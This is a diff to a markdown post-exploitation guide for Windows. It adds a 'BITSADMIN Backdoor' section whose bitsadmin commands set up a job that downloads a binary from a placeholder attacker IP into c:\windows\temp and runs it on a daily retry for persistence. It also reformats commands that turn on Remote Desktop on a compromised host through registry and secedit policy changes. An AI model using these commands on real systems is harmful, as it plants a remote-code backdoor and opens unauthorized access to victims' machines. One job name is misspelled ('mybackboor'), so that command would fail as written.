@@ -13,6 +13,26 @@ return false;
 
 Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
 
+
+### BITSADMIN Backdoor
+Slide #49 of [this slide deck](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607) starts a method of using the `bitsadmin` command (http://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx) to create a backdoor. The steps are as follows:
+
+#### Creating the backdoor
+<pre>
+c:\> bitsadmin /create mybackdoor
+c:\> bitsadmin /addfile mybackdoor http://[AttackerIP]/[AttackerBinary.exe] c:\windows\temp\[AttackerBinary.exe]
+c:\> bitsadmin /SETMINRETRYDELAY mybackdoor 86400
+c:\> bitsadmin /SETNOTIFYCMDLINE mybackdoor c:\windows\temp\[AttackerBinary.exe] NULL
+</pre>
+
+#### Checking to see if everything is set
+<pre>
+c:\> bitsadmin /getnotifycmdline mybackdoor
+c:\> bitsadmin /listfiles mybackdoor
+c:\> bitsadmin /RESUME mybackboor
+</pre>
+
+
 ### Firewall Exceptions
 When you modify a system to talk on the network, you may need to alter the Windows firewall so your traffic is not filtered. The `netsh` command can be used to do this as the command to enable Remote Desktop Protocol below shows:
 
@@ -66,13 +86,13 @@ Remote Desktop allows a remote user to receive a graphical "desktop" of the targ
  1. On the remote system, execute the following commands:
       
     <pre>c:\> sc config termservice start= auto sc config termservice start= auto
-c:\> regedit /s enable_ts.reg
-c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
-c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
-c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
-c:\> gpupdate /Force
-c:\> net start "terminal services"
-</pre>
+    c:\> regedit /s enable_ts.reg
+    c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
+    c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
+    c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
+    c:\> gpupdate /Force
+    c:\> net start "terminal services"
+    </pre>
 
 
 ### Scheduler
